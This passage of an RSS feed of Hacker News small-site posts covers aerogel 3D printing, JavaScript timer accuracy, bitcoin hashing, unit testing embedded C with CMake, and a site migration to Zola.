sun-powered, autocatalytic solutions are particularly appealing in the field of air analysis and purification on a very small scale because of their simplicity and durability.</p><p>Empa researchers are now looking for industrial partners who want to integrate 3D-printed aerogel structures into new high-tech applications.</p><p>–</p><p><i>Header image:&nbsp;To demonstrate that fine aerogel structures can be produced in 3D printing, the researchers printed a lotus flower made of aerogel. Credit: <a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.eurekalert.org%2Fmultimedia%2Fpub%2F240779.php%3Ffrom%3D474517&amp;t=MmUwNzJmYmYyZDlmNTBmNWQwNGRlOWZmMGNhNzc4ZmUwZGVlNjZlNCxKSmhON0xtRw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627194082848079872%2Faerogel-meets-3d-printing&amp;m=0&amp;ts=1598358416">EMPA</a>.</i></p><p><b>Source:&nbsp;<a href="https://t.umblr.com/redirect?z=https%3A%2F%2Fwww.empa.ch%2Fweb%2Fs604%2Faerogel-als-mikrobaustoff&amp;t=ZDdkN2Q2MTk2MmNkYTIyMTI5Y2M3OGUxMjA2NTAzY2NjYjcwMGQ5YyxKSmhON0xtRw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627194082848079872%2Faerogel-meets-3d-printing&amp;m=0&amp;ts=1598358416">Swiss Federal Laboratories for Materials Science and Technology (Empa)</a></b></p><p><b>Full study:</b>&nbsp;“Additive manufacturing of silica aerogels”, <i>Nature</i>.</p><p><a href="https://t.umblr.com/redirect?z=http%3A%2F%2Fdx.doi.org%2F10.1038%2Fs41586-020-2594-0&amp;t=M2YwYTAwZDAwNGI0YjhhMjIyZTcyZTQxNjY1NzU0MWM4MzcyMzQ2ZSxKSmhON0xtRw%3D%3D&amp;b=t%3AeWj9QNbkB8x7_Y2XTyPu8A&amp;p=https%3A%2F%2Fnuadox.com%2Fpost%2F627194082848079872%2Faerogel-meets-3d-printing&amp;m=0&amp;ts=1598358416">http://dx.doi.org/10.1038/s41586-020-2594-0</a><br></p><h2><b>Read Also</b></h2><p><a href="https://nuadox.com/post/173133944747/3d-printing-nasa-orion">3D printed parts for NASA’s Orion can hold up to extreme temperatures</a></p>
                    
                      
                    
                    
                    
                    
                    
                    
                    
                    
                                             
                                <p><span>
                                    <p>
                                    
                                        <a href="https://nuadox.com/tagged/3d-printing">3d printing</a>
                                    
                                        <a href="https://nuadox.com/tagged/materials">materials</a>
                                    
                                        <a href="https://nuadox.com/tagged/engineering">engineering</a>
                                    
                                        <a href="https://nuadox.com/tagged/physics">physics</a>
                                    
                                        <a href="https://nuadox.com/tagged/chemistry">chemistry</a>
                                    
                                        <a href="https://nuadox.com/tagged/nanotechnology">nanotechnology</a>
                                    
                                        <a href="https://nuadox.com/tagged/aerogel">aerogel</a>
                                    
                                    </p>
                                </span></p>
                                
                            </div>
                        </div>
                    </article>
                 
                </div></div>]]>
            </description>
            <link>https://nuadox.com/post/627194082848079872/aerogel-meets-3d-printing</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248422</guid>
            <pubDate>Sun, 23 Aug 2020 00:16:17 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Momentum: Open-source foolproof and good looking pomodoro timer]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248304">thread link</a>) | @pedrolins
<br/>
August 22, 2020 | https://sarmentow.github.io/momentum | <a href="https://web.archive.org/web/*/https://sarmentow.github.io/momentum">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://sarmentow.github.io/momentum</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248304</guid>
            <pubDate>Sat, 22 Aug 2020 23:56:45 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Creating Reliable Timers in JavaScript]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248294">thread link</a>) | @pedrolins
<br/>
August 22, 2020 | https://sarmentow.github.io/creating_reliable_timers_in_javascript.html | <a href="https://web.archive.org/web/*/https://sarmentow.github.io/creating_reliable_timers_in_javascript.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
    <a href="https://sarmentow.github.io/index.html">home</a>
    
    <p>
      <em>Disclaimer: Here I talk about how javascript handles code execution and
        why it's a terrible idea to trust its built-in intervals to work
        accurately, if you just want to see some code, you can take a look at
        <a href="https://github.com/sarmentow/momentum/edit/master/src/components/Timer/index.js">this component</a></em>
    </p>
    <hr>
    <p>
      For the last month or so I had been working on what was pretty much just a
      pomodoro timer app in React. The workflow of the app would be as such:
    </p>
    <ol>
      <li>
        <p>
          The users go in and create their tasks for the day defining the title
          and how many pomodoros there would be for each task.
        </p>
      </li>
      <li>
        <p>
          The users would pick which task they would do next, immediatly
          starting the timer.
        </p>
      </li>
      <li>
        <p>
          After 25 minutes, the timer would ring, starting a 5 minute break
          after which the user would either go to the next 25 minute timer if
          the task has more than 1 pomodoro of duration or complete the task and
          clear the completed task.
        </p>
      </li>
      <li>
        <p>
          If the user completes their task before the timer ends, they can skip
          the 25 minutes and go directly to a 5 minute break or they can also
          skip that break and go back to step 1
        </p>
      </li>
    </ol>
    <h2 id="why-">Why?</h2>
    <p>
      Why would you want to waste your time remaking a project idea already made
      by thousands of people? Well, all of the pomodoro timers out there will
      have at least one of the following issues, upon which I wanted to improve:
    </p>
    <ol>
      <li>Not great UX</li>
      <li>Distracting/dated UI</li>
      <li>Flawed timer logic</li>
    </ol>
    <p>
      It's easy to understand what I mean by saying bad UX and UI, but what
      do I mean about the flawed timer logic?
    </p>
    <h2 id="the-flaw">The flaw</h2>
    <p>
      If you're a curious person you might have the urge to try and break
      software to see if the creators behind apps tested for all edge cases. I
      like to think that the best programmers try to make their apps so that
      even if the user tries to make the app not work, it will.
    </p>
    <p>
      On almost all pomodoro timers available online you'll see this
      particular behaviour where if you spam click the pause/resume button, time
      won't pass. Even those milliseconds between each click aren't
      being accounted by the timer. But why is that? In order to understand this
      flaw, it's necessary to know how you would code a timer.
    </p>
    <p>
      Basically, a timer is composed of some piece of code that periodically
      subtracts from some variable the amount of time passed since the last
      update. This <code>timeleft</code> variable is displayed and then repeats
      the update cycle.
    </p>
    <p>This would translate to something like this in Javascript:</p>
    <pre><code><span>let</span> <span>timeleft</span> = <span>5000</span>;
    <span>let</span> <span>interval</span> = setInterval(() =&gt; {
      <span>if</span> (timeleft &gt; <span>0</span>) {
        timeleft <span>-=</span> <span>1000</span>;
      }
    }, <span>1000</span>);
    </code></pre>
    <p>
      The problem with almost all timer apps and components available is that
      they choose to make the interval between each code execution in
      <strong>exactly</strong> the same order of magnitude they will display on
      the lowest time measure. What I mean by this is that if they're just
      going to show how many minutes and seconds are left, they will create some
      code that updates the timer every 1 second. The problem with that is that
      every time I click pause and then resume, the time until my
      <code>timeleft</code> updates gets set to 1 second from now. So if I keep
      clicking that button on time intervals lower than the 1 second
      <code>timleft</code> update, my timer will just freeze unless I wait more
      than 1 second to click the pause button again.
    </p>
    <p>
      It's an easy fix. All you've got to do is decrease the intervals
      in which <code>timeleft</code> decreases while also decreasing how much
      you subtract from it.
    </p>
    <p>Updating the code I showed you before, it would look like this:</p>
    <pre><code><span>let</span> <span>timeleft</span> = <span>5000</span>;
    <span>let</span> <span>interval</span> = setInterval(() =&gt; {
      <span>if</span> (timeleft &gt; <span>0</span>) {
        timeleft <span>-=</span> <span>100</span>;
      }
    }, <span>100</span>);
    </code></pre>
    <p>
      This technically solves our problem. If it ended here, I would be a happy
      man, but there is a huge issue with the code above that isn't possible
      to be detected without some extra knowledge and especially not fixable
      without some thinking.
    </p>
    <h2 id="the-problem">The problem</h2>
    <p>
      So I went on with the development of my app and after implementing all of
      the features I wanted in order for it to be useful (including a sound for
      when the time was completed), I decided to test it while studying for
      tests. I added my tasks, immediately started the timer and opened some
      tabs with materials for my studying session.
    </p>
    <p>
      I studied for some time until I looked at my phone and noticed that more
      than 25 minutes had passed without any indication that the time had ended.
      So I went to check, and when I opened my timer's tab only 5 minutes
      had passed for the timer.
    </p>
    <h2 id="what-s-happenning-">What's happenning?</h2>
    <p>
      I took some time to understand what was going on with my code. At first I
      thought it was some sort of performance problem related to React and how
      it handled re-renders. I knew that there was some connection between my
      timer lagging and the way the code was being executed, but I couldn't
      figure out why.
    </p>
    <p>
      After some time debugging and not understanding what caused the issue, I
      decided to compare my timer with Google's built-in (and pretty
      accurate) timer that shows up on top of the results when you search for
      any <code>x min timer</code>. I noticed that sometimes my timer would have
      some delay in comparison to Google's even when my timer's window
      was focused and without any other background tabs running. So what was
      going on?
    </p>
    <p>
      I searched around for a solution, but I couldn't find any. There were
      a couple of people online that had the same problem that I did, but they
      had it on many different frameworks, even
      <strong>vanilla Javascript</strong>.
    </p>
    <p>
      After a while, I started noticing that the problem was actually related
      not only with the <code>setInterval</code> function but with
      <strong>the way Javascript code gets executed entirely</strong>.
    </p>
    <h2 id="the-event-loop">The event loop</h2>
    <p>
      What I, a noob CRUD-making naive webdev, didn't think about was what
      was happening under the hood when I executed the code that made my timer
      work.
    </p>
    <p>
      You've probably heard about something called the Javascript
      <strong>event loop</strong>. If you haven't, I suggest you
      <a href="https://www.youtube.com/watch?v=8aGhZQkoFbQ">watch Philip Roberts' talk on JSConf about it</a>, he goes pretty deep into it and the talk might make you start think
      about some of the low-level stuff you've never thought about while
      making your little web application. But even if you don't watch it,
      I'll explain the basics in order for you to understand what does it
      have to do with our issue.
    </p>
    <p>
      For our purposes, all that you need to know is that the event loop is just
      the way that Javascript treats code execution. Javascript, being a single
      threaded programming language, can only make computations one sequence at
      a time. That means that every time your code does something, your program
      waits until that computation has ended in order for it to resume
      execution. This happens until your program has reached the end. The event
      loop is a pattern that the program follows in order to make the single
      threaded aspect of the language not suck so bad. The event loop creates
      kind of a priority-based list of things your computer should run.
    </p>
    <h2 id="the-naive-implementation">The naive implementation</h2>
    <p>
      So what's the problem after all? It's simple: our implementation
      assumes that our code will execute instantly after those 100 milliseconds
      we defined as the second argument in the
      <code>setInterval</code> function. Javascript, being a single threaded
      function, can't ensure our code will be executed as soon as those 100
      milliseconds go by because there could be some computation going on right
      when my timer code should execute, creating a delay. Sometimes the delay
      was acceptable but other times it seemed like the timer freezed.
    </p>
    <p>
      It's possible to see what are the effects of being single threaded
      when performing a computation with the following code:
    </p>
    <pre><code><span>for</span> (<span>let</span> i = <span>0</span>; i &lt; <span>100000</span>; i++) {
      <span>for</span> (<span>let</span> i = <span>0</span>; i &lt; <span>10000</span>; i++) {}
    }
    
    console.<span>log</span>(<span>"hi!"</span>);
    </code></pre>
    <p>
      if you run this code with Node.js or in your browser, you will see that
      <code>hi</code> will take a good while to log because our thread gets busy
      running the nested for loops.
    </p>
    <p>
      So if we can't trust javascript to execute our code on time how can we
      code a program like a timer? And if timers are impossible to be accurate,
      how come the google timer works and mine doesn't?
    </p>
    <h2 id="the-attempts">The attempts</h2>
    <p>I tried every type of fix I could think of.</p>
    <h3 id="web-workers">Web workers</h3>
    <p>
      At first I tried creating another javascript thread just for our timer,
      that way I could ensure that my timer would always run on time (no pun
      intended). To do that you need to use something called a Web Worker that
      was made exactly for having more than one thread at a time running on your
      browser.
    </p>
    <p>
      That didn't really work. I felt like it was being way too hard and
      awkward to write code, and for something as simple as this there was no
      way that I was making the right choice. So I had a feeling that I should
      go looking elsewhere.
    </p>
    <h3 id="window-requestanimationframe-">window.requestAnimationFrame()</h3>
    <p>
      Then, I found a web API called
      <code>window.requestAnimationFrame()</code>. According to the MDN docs,
      this API was made to ensure that your browser performs an animation before
      the next repaint. At first I thought that it would be weird to use this to
      update our timer, but after seeing that it takes a callback …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://sarmentow.github.io/creating_reliable_timers_in_javascript.html">https://sarmentow.github.io/creating_reliable_timers_in_javascript.html</a></em></p>]]>
            </description>
            <link>https://sarmentow.github.io/creating_reliable_timers_in_javascript.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248294</guid>
            <pubDate>Sat, 22 Aug 2020 23:55:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Bitcoin Maxima]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248264">thread link</a>) | @FailMore
<br/>
August 22, 2020 | https://taaalk.co/t/bitcoin-maxima-other-crypto-things#whoop | <a href="https://web.archive.org/web/*/https://taaalk.co/t/bitcoin-maxima-other-crypto-things#whoop">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          <div target="spkr-color-">
            <div><div>
  <div><p>OK. What is hashing? Let's just take a look.Â&nbsp;</p></div><div><p>hash("thomas hartman") =&gt; b73d127e8e76ff01b5cb833980b9712cf1dbc92064b1d2fae700105c8227121b</p></div><div><p>This beast is a 64 digit hex number. Instead of the usual 10 digits 0-9, it has the 16 digits 0-9a-f. But, it's just a number. In decimal it would be</p></div><div><p>82881156605080050388863774003735601367246355697689529077366882559854056509979</p></div><div><p>You could also use 1s and 0s, in which case there would be 256 binary 0-1 digits (bits). I'm going to go back to using hex because it will make googling for historically important hashes easier, further on. </p></div><div><p>Hashing takes some some data, my name in this case, and applies some gnarly, but basic -- but tedious -- arithmetic and cut paste type transformations to produce a 256 bit numerical output. The transformation has a lot of steps but is <a href="https://en.bitcoinwiki.org/wiki/SHA-256">completely deterministic</a>. You could do it <a href="https://www.youtube.com/watch?v=y3dqhixzGVo">by hand</a> if you were extremely careful, and extremely patient. It takes 10 hours for a human to compute a hash using pen and graph paper. My MacBook computes a hash in microseconds. </p></div><div><p>There are hundreds of websites where you play around with hashing, and reproduce the hashes we will be discussing. Just google for "sha256 calculator".</p></div><div><p>You could think of a hash as a kind of fingerprint for some arbitrary data. It is theoretically possible, but in practice impossible, for two inputs to hash to the same result. And you can't reverse a hash. If I present you with f04b773b796ddb607c9c0df477b4738a690a626e49f59bc91a37dd0cd05b70eeÂ&nbsp; and ask you to come up with an input that hashes to that, you will never, ever, find one. Unless you have a multi trillion years life span and galactic core black hole level of energy. Then, I suppose, you would get it eventually. Or, I could tell you a secret...</p></div><div><p>hash("joshua summers") =&gt; f04b773b796ddb607c9c0df477b4738a690a626e49f59bc91a37dd0cd05b70eeÂ&nbsp; </p></div><div><p>Moving on, if you tweak the data in a tiny way, say by tacking on the string "123" at the end, you get a completely different result.</p></div><div><p>hash("joshua summers" + "123") =&gt; hash("joshua summers123") =&gt; 304d0d26fd5ebb3bd3f56fcb48f6fdc6c8b0dbf9be088b34835b3ec988be1ab7</p></div><div><p>Completely different looking from the original "joshua summers" hash. We call "123" a nonce. A bit of NONSEnse data that you tack onto some fixed data, that is, data that you care about. The nonce can change and it doesn't matter. The fixed data matters, so it can't change.</p></div><div><p>Hashing always produces a 64 hex digit output. What if we had some fixed data ("joshua summers"), and we wanted a nonce that would make the first digit of the resulting hash 0? "123" didn't work. The first digit of the resulting hash was 3. Let's keep looking... sitting at my macbook, I try nonces manually by incrementing 123 until...</p></div><div><p>hash("joshua summers" + "134") =&gt; hash("joshua summers134") =&gt; </p></div><div><p>0120353865b8576fc09988444bdeed6f44a1d9433a7058064911d66eafda43e3</p></div><div><p>Found one! Took eleven tries. (134-123)</p></div><div><p>And that is hash mining. By producing a nonce and a hash with zero in the first digit, I PROVED I did some WORK connected to the fixed data. The nonce with the hash is like a stamp of authenticity that proves that, for some reason, I care about sacrificing some work attached to the fixed data "joshua summers".</p></div><div><p>Work is another word for energy. Each hash costs my macbook battery a tiny bit of chemical energy. Recall, I could do this by hand instead of using a computer,Â&nbsp; taking 10 hours for each try. I would need feeding, since eleven hashes on graph paper would keep me busy (going slowly insane) for four days. Like my macbook, my body needs energy to hash. </p></div><div><p>On average, I would expect to have to try 16 nonces to get a hit. I got slightly lucky with 11 nonces. If you asked me for a hash that starts with 2 zeros, I would expect to have to try 16 times more nonces, 256 instead of 16. The more zeros, the more energy. </p></div><div><p>For all my hashes, you need to compute just one hash to convince yourself that my work was valid. The proof had better be cheaper than the work (and it is). Just as assaying gold to stop counterfeiters had better be cheaper than digging the gold itself up, or why bother. </p></div><div><p>Now let's talk about bitcoin. With bitcoin mining, instead of your name, the fixed data is an "unconfirmed" (ie unstamped) block. An unconfirmed block is a group of bitcoin ledger transactions, along with a hash of the previous confirmed (stamped) block. The link to the previous block, via that block's hash, is what forges individual blocks into a blockchain. Miners try nonces till they find a stamp (nonce + hash) for that unstamped block that proves they did some work. It is the same as in the example I gave before, just with more zeros. </p></div><div><p>Visually, the difficulty condition is a bunch of zeros at the beginning of the hash. The more zeros required, the more valuable the stamp. Each additional zero makes the search for the stamp 16 times harder. </p></div><div><p>In 2009, the very first bitcoin block, called the genesis block, hashed to </p></div><div><p>000000000019d6689c085ae165831e934ff763ae46a2a6c172b3f1b60a8ce26f (google this) </p></div><div><p>Satoshi mined this block. I picture him with a bunch of scavenged laptops in his mother's basement. He uses multiple laptops to try as many nonces as possible, all hashing at the same time, working in parallel. </p></div><div><p>There are ten zeros of difficulty required for this first block.</p></div><div><p>16*16*16*16*16*16*16*16*16*16 =&gt; 1,099,511,627,776</p></div><div><p>So, satoshi had to try a trillion more nonces than I just did to find a nonce that worked. It took satoshi and his little cluster of computers (his mine) about ten minutes to crack this first block. This is specified in the bitcoin protocol. Blocks should take ten minutes, on average.</p></div><div><p>The energy spent to to find the nonce makes the block precious. Like the diesel spent on earthmoving equipment to find gold makes gold precious. Gold is a precious metal. A bitcoin block hash is a precious number. The more zeros you see at the beginning of a block hash, the more precious the hash. </p></div><div><p>Now let's look at a recent hash, from today (2020)</p></div><div><p>0000000000000000000081f22162e5603c4349b66f12a6b4f4274dff14bdc3bc (you can google this too)</p></div><div><p>It doesn't look that different. It's just 20 zeros instead of 10. But, as we saw before, ten zeros means a trillion times harder. If modern miners were using the same hardware as satoshi, that would be a trillion times as many computers mining, to find the hash in the same ten minutes. A trillion times as much electricity. In fact it's a bit less than that. Modern miners use special single purpose computers, called asics, that are a lot more energy efficient than the general purpose CPUs satoshi started out with. But it's still an enormous amount of hardware and electricity, trying an enormous number of nonces, to solve the next block.</p></div><div><p>All these giant warehouses full of racks and racks of miners are hashing away, because if you solve a block stamp, you receive a block reward of 6.25 bitcoin (currently), plus some transaction fees. Altogether it's about $60k, up for grabs every ten minutes. So, mining is a lottery that pays $60k every ten minutes. If the price of bitcoin goes up, or even if people just expect it to, more miners join. Bitcoin starts to be found too quickly... nine minutes instead of ten minutes... eight minutes... then the protocol adjusts to require enough zerosÂ&nbsp; so he block time goes back to ten minutes. (Slightly hand waving there, but close enough.) This difficulty adjustment happens every two weeks. The increased difficulty (more zeros) means bitcoin got more secure, and this in turn drives price goes up. </p></div><div><p>This is the double ratchet effect that I believe will continue until bitcoin occupies its market niche and replaces money as a global utility in a decade or so. It's worked so far. Three more zeros in the difficulty (around 4000x increase in difficulty) and bitcoin has replaced printed fiat from central banks. ($10 million/bitcoin, as opposed to around $10k today.) It may feel like a lot of ground to cover, but if you just count zeros in the difficulty, bitcoin has practically already won.</p></div><div><p>As mentioned before, each block includes the hash of the previous block. This makes a sequence of blocks, that is, a chain. A blockchain is a chain of blocks. Blocks are expensive.Â&nbsp; So a blockchain is very expensive. </p></div><div><p>The bitcoin protocol says the most expensive blockchain in terms of physical energy, measured in total hashes,Â&nbsp; is the true gold. There can be only one most expensive chain. This is extremely important. <a href="https://www.youtube.com/watch?v=_J3VeogFUOs">There can be only one</a>. </p></div><div><p>An unconfirmed block has no proof of work, so you can't trust the transactions in it if someone just paid you with one of them. The miners haven't approved it. There is no work behind it. So, these expensive stamps of approvals that each block gets (the precious hashes) prevent cheating, that is, double spending the same bitcoin. Mining is a security system. Miners are the bodyguards of bitcoin. </p></div><div><p>You have toÂ&nbsp; pay your bodyguards, or they turn on you. In fact, the largest bitcoin miner, Bitmain, attacked bitcoin in 2017. As the whitepaper foretold, the attack failed. Hundreds of millions of dollars worth of hashes were sacrificed for nothing, and bitmain was nearly driven into bankruptcy. Bodyguards are not hired for their brains. </p></div><div><p>Anyways, miners are paid in block reward, which is newly minted bitcoin, plus transaction fees. The bitcoin supply is finite, with minting scheduled to end in the year 2140. The reward halves every 4 years. For bitcoin to succeed, the transaction fees have to be sufficiently high to motivate miners to keep working hard enough to make bitcoin safe after the block reward eventually goes away. Transaction fees may ultimately stabilize at thousands of dollars per transaction (pennies now). Only power users like banks and pension funds will then be able to afford the blockchain. </p></div><div><p>If this happens, and I think it will, most users will never touch the blockchain directly, but will use second layer systems such as lightning. So far, the gradual replacement of block rewards with transaction fees appears to be working …</p></div></div></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://taaalk.co/t/bitcoin-maxima-other-crypto-things#whoop">https://taaalk.co/t/bitcoin-maxima-other-crypto-things#whoop</a></em></p>]]>
            </description>
            <link>https://taaalk.co/t/bitcoin-maxima-other-crypto-things#whoop</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248264</guid>
            <pubDate>Sat, 22 Aug 2020 23:50:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Unit Testing Embedded C]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24248082">thread link</a>) | @clnhlzmn
<br/>
August 22, 2020 | https://colinholzman.xyz/2020/08/22/unit-testing-embedded-c | <a href="https://web.archive.org/web/*/https://colinholzman.xyz/2020/08/22/unit-testing-embedded-c">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><h2>Unit Testing Embedded C</h2><p>I have been trying to be more thorough in my testing efforts lately. What has always seemed like a big challenge is how to automate testing for source code that is targeting a microcontroller like AVR? I will talk about two sides of this challenge: decoupling and running unit tests.</p><h2 id="decoupling">Decoupling</h2><p>I write a lot of code for AVR microcontrollers so the code here will be in that context, but these ideas work equally well for any target. Decoupling means to separate your software into small pieces that are coupled only with a small number of dependencies. A dependency could be a target header file like <code>avr/io.h</code> or it could be another software module that you have written. In either case, keeping the number of dependencies small will improve your chances of successful unit testing.</p><p>Assume you have a module called <code>relay_control</code> which is intended to turn a relay on if an input value exceeds a threshold and off otherwise. Your <code>relay_control.c</code> file might look like this:</p><pre><code>#include &lt;avr/io.h&gt;

#define THRESHOLD (100)

void relay_control(int value) {
    if (value &gt; THRESHOLD) {
        PORTA |= 1;
    } else {
        PORTA &amp;= ~1;
    }
}
</code></pre><p>The <code>relay_control</code> function takes <code>value</code>, compares it to <code>THRESHOLD</code>, and sets bit zero of <code>PORTA</code> high or low accordingly (assuming <code>PA0</code> is somehow controlling the relay). Of course this is a trivially simple function but imagine some other complicated logic in it’s place. One way to test this function is to compile this using GCC on your development machine while somehow including a mock <code>avr/io.h</code> that defines <code>PORTA</code> in such a way that the test code can determine if the relay is on or off for a range of the <code>value</code> argument passed to <code>relay_control</code>. That requires you to mock the header file which is not always possible. A better way is to use features of the C language to decouple the direct io port access from <code>relay_control</code> so that the <code>relay_control</code> module doesn’t depend on <code>avr/io.h</code>. That way you can test it on your development machine or wherever you want. The new <code>relay_control.c</code> could look something like this:</p><pre><code>#define THRESHOLD (100)

void (*relay_writer)(char relay_on);

void relay_control(int value) {
    if (relay_writer) 
        relay_writer(value &gt; THRESHOLD);
}
</code></pre><p>The new <code>relay_control.c</code> doesn’t depend on <code>avr/io.h</code>. Instead it depends on a function pointer, <code>relay_writer</code>, that acts as an interface to the hardware. Now the application can implement <code>relay_writer</code> to access the hardware, and your test code can implement it to set a bit in memory to allow you to check the output of the <code>relay_control</code> module. Your application could implement <code>relay_writer</code> like this (perhaps in <code>relay_control_hal.c</code> [relay control hardware abstraction layer]):</p><pre><code>#include &lt;avr/io.h&gt;

extern void (*relay_writer)(char relay_on);

void relay_writer_impl(char relay_on) {
    if (relay_on) {
        PORTA |= 1;
    } else {
        PORTA &amp;= ~1;
    }
}

void relay_control_init(void) {
    relay_writer = relay_writer_impl;
}
</code></pre><p>The hardware abstraction layer code is purposfully kept as trivial as possible, it’s only accessing the io port, because the only way to test it is to run it on the target platform (because it depends on <code>avr/io.h</code>). Since it’s so simple you’re not as concerned with testing <code>relay_control_hal.c</code> (trivial hardware access only) as you are with <code>relay_control.c</code> (non-trivial application logic).</p><p>Now you can write a test, <code>test_relay_control.c</code>, that might look like this:</p><pre><code>#include &lt;assert.h&gt;
#include "relay_control.h"

char relay_state = 0;

void relay_writer_test_impl(char relay_on) {
    relay_state = relay_on;
}

extern void (*relay_writer)(char relay_on);

int main(void) {
    relay_writer = relay_writer_test_impl;
    relay_control(0);
    assert(relay_state == 0);
    relay_control(1000);
    assert(relay_state == 1);
    return 0;
}
</code></pre><p>Decoupling <code>relay_control.c</code> from the hardware (<code>avr/io.h</code>) has the added benefit that your tests are not constrained by the target environment’s memory or processor limitations. The tests can use the full power of the C language.</p><p>Now whenever you make a change to <code>relay_control.c</code> you can quickly run the test to make sure that the functionality remains. But how do you run the test?</p><h2 id="running-unit-tests">Running unit tests</h2><p>One way is to use a simple makefile that compiles <code>test_relay_control.c</code> and <code>relay_control.c</code> and then runs the resulting executable. Or you could use a more advanced build system generator like CMake. I recommend using CMake because it gets very tricky very quickly to link up a bunch of <code>.c</code> and <code>.h</code> files in different directories to create an executable with only a makefile. I have only recently learned how to use CMake so please bear with me on this. The solution that I have come up with for running unit tests on windows goes like this:</p><ol><li><p>create a directory somewhere in your project called <code>test</code></p></li><li><p>in the <code>test</code> directory create a file called <code>cmakelists.txt</code></p><p><code>cmakelists.txt</code>:</p><pre><code> cmake_minimum_required (VERSION 3.18)
 project(Test)
 enable_testing()
 add_executable(Test 
     test_relay_control.c 
     &lt;path to relay_control.c&gt;
 )
 include_directories(&lt;path to relay_control.h&gt;)
 add_test(NAME Test COMMAND Test)
</code></pre><p>In this case there is only one test called <code>Test</code> which is generated by the <code>add_executable</code> and <code>add_test</code> commands.</p><p>To add another test you would first create your test file <code>another_test.c</code> and add the following lines to <code>cmakelists.txt</code></p><pre><code> add_executable(AnotherTest 
     another_test.c 
     &lt;path to another_file_under_test.c&gt;
 )
 include_directories(&lt;path to headers needed by another_test.c&gt;)
 add_test(NAME AnotherTest COMMAND AnotherTest)
</code></pre></li><li><p>in the <code>test</code> directory create a file called <code>test.sh</code></p><p><code>test.sh</code>:</p><pre><code> if ! [[ -d "build" ]]; then
     mkdir build
 fi
 cd build
 cmake .. -G"MinGW Makefiles"
 cmake --build . &amp;&amp; ctest -C Debug
</code></pre><p>In this case I am using the <code>MinGW Makefiles</code> generator for CMake because I run my tests on Windows but I would like to use GCC rather than the default MSVC.</p></li></ol><p>With those steps having been done you can now run <code>test.sh</code> and whatever tests you have defined will be run and the output will show you clearly which have passed and which have failed.</p><p>Happy testing!</p><span><time datetime="2020-08-22T00:00:00-04:00">August 22, 2020</time> · <a href="https://colinholzman.xyz/tag/programming">programming</a>, <a href="https://colinholzman.xyz/tag/C">C</a>, <a href="https://colinholzman.xyz/tag/coding">coding</a>, <a href="https://colinholzman.xyz/tag/software">software</a>, <a href="https://colinholzman.xyz/tag/engineering">engineering</a></span> <!--<span class="meta"><time datetime="2020-08-22T00:00:00-04:00">August 22, 2020</time> &middot; <a class="post" href="/tag/programming">programming</a>, <a class="post" href="/tag/C">C</a>, <a class="post" href="/tag/coding">coding</a>, <a class="post" href="/tag/software">software</a>, <a class="post" href="/tag/engineering">engineering</a></span> --></section></div>]]>
            </description>
            <link>https://colinholzman.xyz/2020/08/22/unit-testing-embedded-c</link>
            <guid isPermaLink="false">hacker-news-small-sites-24248082</guid>
            <pubDate>Sat, 22 Aug 2020 23:17:12 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Going Full Static with Zola]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24247815">thread link</a>) | @figbert
<br/>
August 22, 2020 | https://figbert.com/posts/going-full-static/ | <a href="https://web.archive.org/web/*/https://figbert.com/posts/going-full-static/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>Those of you who read <a href="https://figbert.com/posts/i-wrote-this-three/#next-steps">my last "I Wrote This" post</a> will know that I was having some trouble with my website. My site was coded using <a href="https://sapper.svelte.dev/">Sapper</a>, a
<a href="https://svelte.dev/">Svelte</a>-based web-app framework I had been using for some time. I had chosen to use Sapper because it allowed me to stay as close to the web-metal as possible, while
still letting me do some fancy things like use components, scoped CSS, and <a href="https://sapper.svelte.dev/docs#Server_routes">server routes</a>. However, after diving deeper into website tests and statistics, I
started noticing that my "static" site had a lot more moving parts than I thought. The HTML was crammed full of inline scripts and <code>blob://</code>s, tanking performance, wreaking
havoc on my <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">CSP</a>, and breaking the site for people with scripts disabled. I decided to move the site to <a href="https://www.getzola.org/">Zola</a>, a ludicrously simple static site generator made in
Rust. Feel free to check out the <a href="https://github.com/figbert/figbert.com">source code here</a>.</p>
<h2 id="npm-hell">NPM Hell</h2>
<p>I decided I was going to rewrite my site <del>because I have a bad habit of rewriting everything all the time</del> largely because of Sapper's underwhelming response to <a href="https://github.com/sveltejs/sapper/issues/1175">this Github
issue</a>, which proposes a "strict export" for Sapper sites to remove inline scripts and use of <code>eval()</code>. I think this is a great idea, but it unfortunately has not
received much attention (though it appears that as I'm writing this, it has been added to a "Roadmap Triage" project board). I started a new branch and began working to
translate my site to Sapper's main competitor, <a href="https://routify.dev/">Routify</a>. Sapper and Routify are not the same thing, but for me they both would serve well enough. After around two
